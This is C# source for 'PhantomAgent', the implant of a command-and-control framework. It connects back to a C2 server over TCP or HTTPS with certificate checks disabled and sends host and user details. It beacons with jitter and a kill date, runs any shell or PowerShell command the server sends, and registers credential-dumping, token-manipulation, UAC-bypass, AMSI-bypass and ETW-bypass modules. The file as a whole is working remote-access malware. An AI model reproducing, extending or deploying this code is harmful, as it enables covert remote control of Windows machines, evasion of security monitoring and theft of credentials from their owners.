using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using PhantomAgent.Core;
using PhantomAgent.Crypto;
using PhantomAgent.Modules;
using PhantomAgent.Transport;

namespace PhantomAgent;

internal static class Program
{
    private const string AgentVersion = "5.2";

    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
        WriteIndented = false,
    };

    private static string GenerateAgentId()
    {
        byte[] bytes = RandomNumberGenerator.GetBytes(6);
        return $"ps-{Convert.ToHexString(bytes).ToLowerInvariant()}";
    }

    private static void Main(string[] args)
    {
        string host = "0.0.0.0";
        int port = 4444;
        double sleep = 5.0;
        double jitter = 20.0;
        string? killDate = null;
        bool noEncrypt = false;
        string transportType = "tcp";

        // Parse command line arguments
        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--host" when i + 1 < args.Length: host = args[++i]; break;
                case "--port" when i + 1 < args.Length: port = int.Parse(args[++i]); break;
                case "--sleep" when i + 1 < args.Length: sleep = double.Parse(args[++i]); break;
                case "--jitter" when i + 1 < args.Length: jitter = double.Parse(args[++i]); break;
                case "--kill-date" when i + 1 < args.Length: killDate = args[++i]; break;
                case "--no-encrypt": noEncrypt = true; break;
                case "--transport" when i + 1 < args.Length: transportType = args[++i].ToLowerInvariant(); break;
            }
        }

        string agentId = GenerateAgentId();

        ITransport transport = transportType switch
        {
            "http" or "https" => new HttpTransport($"https://{host}:{port}", skipCertValidation: true),
            _ => new TcpTransport(host, port),
        };

        AesCipher? cipher = null;
        if (!noEncrypt)
            cipher = new AesCipher(AesCipher.GenerateKey());

        var scheduler = new Scheduler(sleep, jitter, killDate);
        var executor = new Executor();
        var dispatcher = new Dispatcher();

        // Register all modules
        dispatcher.RegisterModule(Recon.Name, Recon.GetCommands());
        dispatcher.RegisterModule(TokenManip.Name, TokenManip.GetCommands());
        dispatcher.RegisterModule(CredDump.Name, CredDump.GetCommands());
        dispatcher.RegisterModule(UacBypass.Name, UacBypass.GetCommands());
        dispatcher.RegisterModule(AmsiBypass.Name, AmsiBypass.GetCommands());
        dispatcher.RegisterModule(EtwBypass.Name, EtwBypass.GetCommands());
        dispatcher.RegisterModule(RegistryModule.Name, RegistryModule.GetCommands());
        dispatcher.RegisterModule(ServicesModule.Name, ServicesModule.GetCommands());
        dispatcher.RegisterModule(ActiveDirectoryModule.Name, ActiveDirectoryModule.GetCommands());

        // Built-in shell commands
        dispatcher.RegisterModule("shell", new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["cd"] = a =>
            {
                string path = a != null && a.TryGetValue("path", out var p) ? p.GetString() ?? "." : ".";
                var (result, ok) = executor.Cd(path);
                return new Dictionary<string, object> { ["path"] = result, ["ok"] = ok };
            },
            ["pwd"] = _ => executor.Cwd,
            ["capabilities"] = _ => new Dictionary<string, object>
            {
                ["modules"] = dispatcher.Modules,
                ["commands"] = dispatcher.ListCommands(),
            },
        });

        int seq = 0;
        string? sessionId = null;

        while (true)
        {
            if (scheduler.CheckKillDate())
                break;

            if (!transport.Connected)
            {
                if (!transport.Connect())
                {
                    scheduler.Wait();
                    continue;
                }

                // Register with C2 server
                var sysInfo = GetSystemInfo(agentId, scheduler, dispatcher);
                var regMsg = BuildMessage("register", sysInfo, agentId, seq, sessionId);

                // Compute HMAC-SHA256 auth using PSK
                string psk = Environment.GetEnvironmentVariable("PS_AUTH_KEY") ?? "phantomshell-default-key";
                using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(psk));
                string authHash = Convert.ToHexString(
                    hmac.ComputeHash(Encoding.UTF8.GetBytes(agentId))).ToLowerInvariant();
                regMsg["auth"] = authHash;

                if (!SendMessage(transport, cipher, regMsg))
                {
                    scheduler.Wait();
                    continue;
                }
                seq++;

                // Wait for ACK
                var ack = RecvMessage(transport, cipher);
                if (ack != null && GetType(ack) == "ack")
                {
                    var payload = GetPayload(ack);
                    sessionId = GetStringProp(payload, "session_id");
                    double? newSleep = GetDoubleProp(payload, "sleep");
                    double? newJitter = GetDoubleProp(payload, "jitter");
                    string? newKillDate = GetStringProp(payload, "kill_date");
                    scheduler.UpdateConfig(newSleep, newJitter, newKillDate);
                }
            }

            // Send beacon
            var beaconPayload = new Dictionary<string, object>
            {
                ["uptime"] = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                ["idle"] = true,
                ["active_tasks"] = 0,
                ["cwd"] = executor.Cwd,
                ["username"] = Environment.UserName,
                ["integrity"] = GetIntegrityLevel(),
                ["pid"] = Environment.ProcessId,
            };
            SendMessage(transport, cipher, BuildMessage("beacon", beaconPayload, agentId, seq, sessionId));
            seq++;

            // Receive task
            var msg = RecvMessage(transport, cipher);
            if (msg != null && GetType(msg) == "task")
            {
                var taskPayload = GetPayload(msg);
                string taskId = GetStringProp(taskPayload, "task_id") ?? "unknown";
                string command = GetStringProp(taskPayload, "command") ?? "";
                var cmdArgs = GetArgsProp(taskPayload);
                string? raw = GetStringProp(taskPayload, "raw");
                int timeout = GetIntProp(taskPayload, "timeout") ?? 30;

                Dictionary<string, object> responsePayload;

                if (command == "exit")
                {
                    responsePayload = new Dictionary<string, object>
                    {
                        ["task_id"] = taskId,
                        ["status"] = "ok",
                        ["output"] = "Agent shutting down",
                    };
                    SendMessage(transport, cipher, BuildMessage("response", responsePayload, agentId, seq, sessionId));
                    break;
                }

                if (command == "shell")
                {
                    string cmdToRun = raw ?? (cmdArgs != null && cmdArgs.TryGetValue("cmd", out var cmdVal)
                        ? cmdVal.GetString() ?? "" : "");
                    bool usePowerShell = cmdArgs != null && cmdArgs.TryGetValue("powershell", out var psVal) &&
                                         psVal.ValueKind == JsonValueKind.True;
                    var (stdout, stderr, exitCode) = executor.Execute(cmdToRun, timeout, usePowerShell);
                    responsePayload = new Dictionary<string, object>
                    {
                        ["task_id"] = taskId,
                        ["status"] = exitCode == 0 ? "ok" : "error",
                        ["output"] = stdout,
                        ["error"] = stderr,
                        ["exit_code"] = exitCode,
                    };
                }
                else if (dispatcher.HasCommand(command))
                {
                    var result = dispatcher.Dispatch(command, cmdArgs);
                    responsePayload = new Dictionary<string, object> { ["task_id"] = taskId };
                    foreach (var (k, v) in result)
                        responsePayload[k] = v;
                }
                else
                {
                    // Fall through to shell execution for unrecognized commands
                    string cmdToRun = raw ?? command;
                    if (cmdArgs != null && cmdArgs.Count > 0)
                    {
                        var argParts = cmdArgs.Values.Select(v => v.ToString());
                        cmdToRun += " " + string.Join(" ", argParts);
                    }
                    var (stdout, stderr, exitCode) = executor.Execute(cmdToRun, timeout);
                    responsePayload = new Dictionary<string, object>
                    {
                        ["task_id"] = taskId,
                        ["status"] = exitCode == 0 ? "ok" : "error",
                        ["output"] = stdout,
                        ["error"] = stderr,
                        ["exit_code"] = exitCode,
                    };
                }

                SendMessage(transport, cipher, BuildMessage("response", responsePayload, agentId, seq, sessionId));
                seq++;
            }

            scheduler.Wait();
        }

        transport.Disconnect();
    }

    private static Dictionary<string, object> BuildMessage(string msgType, Dictionary<string, object> payload,
        string agentId, int seq, string? sessionId)
    {
        var msg = new Dictionary<string, object>
        {
            ["message_id"] = Guid.NewGuid().ToString(),
            ["timestamp"] = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
            ["sequence"] = seq,
            ["agent_id"] = agentId,
            ["type"] = msgType,
            ["payload"] = payload,
        };
        if (sessionId != null)
            msg["session_id"] = sessionId;
        return msg;
    }

    private static bool SendMessage(ITransport transport, AesCipher? cipher, Dictionary<string, object> msg)
    {
        byte[] data = JsonSerializer.SerializeToUtf8Bytes(msg, JsonOpts);
        if (cipher != null)
            data = cipher.Encrypt(data);
        return transport.Send(data);
    }

    private static Dictionary<string, JsonElement>? RecvMessage(ITransport transport, AesCipher? cipher)
    {
        byte[]? data = transport.Recv();
        if (data == null) return null;

        if (cipher != null)
        {
            try { data = cipher.Decrypt(data); }
            catch { /* try plaintext */ }
        }

        try
        {
            return JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(data);
        }
        catch
        {
            return null;
        }
    }

    private static Dictionary<string, object> GetSystemInfo(string agentId, Scheduler scheduler, Dispatcher dispatcher)
    {
        string integrity = GetIntegrityLevel();
        return new Dictionary<string, object>
        {
            ["hostname"] = Environment.MachineName,
            ["username"] = Environment.UserName,
            ["domain"] = Environment.UserDomainName,
            ["os"] = "windows",
            ["os_version"] = Environment.OSVersion.ToString(),
            ["arch"] = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            ["agent_type"] = "csharp",
            ["agent_version"] = AgentVersion,
            ["pid"] = Environment.ProcessId,
            ["process_name"] = Environment.ProcessPath ?? "PhantomAgent",
            ["integrity"] = integrity,
            ["is_admin"] = integrity is "high" or "system",
            ["capabilities"] = dispatcher.Modules,
            ["transport"] = "tcp",
            ["sleep"] = scheduler.SleepTime,
            ["jitter"] = scheduler.JitterPercent,
        };
    }

    private static string GetIntegrityLevel()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
                return identity.IsSystem ? "system" : "high";
            return "medium";
        }
        catch
        {
            return "medium";
        }
    }

    private static string? GetType(Dictionary<string, JsonElement> msg)
    {
        return msg.TryGetValue("type", out var val) ? val.GetString() : null;
    }

    private static Dictionary<string, JsonElement>? GetPayload(Dictionary<string, JsonElement> msg)
    {
        if (!msg.TryGetValue("payload", out var val)) return null;
        return JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(val.GetRawText());
    }

    private static string? GetStringProp(Dictionary<string, JsonElement>? dict, string key)
    {
        if (dict == null || !dict.TryGetValue(key, out var val)) return null;
        return val.ValueKind == JsonValueKind.String ? val.GetString() : null;
    }

    private static int? GetIntProp(Dictionary<string, JsonElement>? dict, string key)
    {
        if (dict == null || !dict.TryGetValue(key, out var val)) return null;
        return val.ValueKind == JsonValueKind.Number ? val.GetInt32() : null;
    }

    private static double? GetDoubleProp(Dictionary<string, JsonElement>? dict, string key)
    {
        if (dict == null || !dict.TryGetValue(key, out var val)) return null;
        return val.ValueKind == JsonValueKind.Number ? val.GetDouble() : null;
    }

    private static Dictionary<string, JsonElement>? GetArgsProp(Dictionary<string, JsonElement>? dict)
    {
        if (dict == null || !dict.TryGetValue("args", out var val)) return null;
        if (val.ValueKind != JsonValueKind.Object) return null;
        return JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(val.GetRawText());
    }
}
